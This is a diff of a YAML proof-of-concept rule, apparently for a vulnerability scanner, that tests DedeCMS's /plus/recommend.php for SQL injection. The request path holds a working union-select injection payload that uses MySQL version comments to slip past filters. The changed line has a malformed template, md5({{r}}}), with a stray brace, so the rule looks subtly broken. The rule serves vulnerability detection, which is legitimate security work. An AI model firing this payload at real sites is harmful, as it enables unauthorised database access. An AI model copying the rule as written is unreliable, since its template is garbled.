@@ -1,10 +1,13 @@
 name: poc-yaml-dedecms-sqli
 
+set:
+  r: randomInt(800000000, 1000000000)
+
 rules:
   - method: GET
-    path: /plus/recommend.php?action=&aid=1&_FILES[type][tmp_name]=\' or mid=@`\'` /*!50000union*//*!50000select*/1,2,3,md5(99999999),5,6,7,8,9%23@`\'`+&_FILES[type][name]=1.jpg&_FILES[type] [type]=application/octet-stream&_FILES[type][size]=111
+    path: /plus/recommend.php?action=&aid=1&_FILES[type][tmp_name]=\' or mid=@`\'` /*!50000union*//*!50000select*/1,2,3,md5({{r}}}),5,6,7,8,9%23@`\'`+&_FILES[type][name]=1.jpg&_FILES[type] [type]=application/octet-stream&_FILES[type][size]=111
     expression: |
-      response.body.bcontains(b"ef775988943825d2871e1cfa75473ec")
+      response.status == 200 && response.body.bcontains(bytes(md5(string(r))))
 detail:
   author: durkworf(https://github.com/durkworf)
   links:
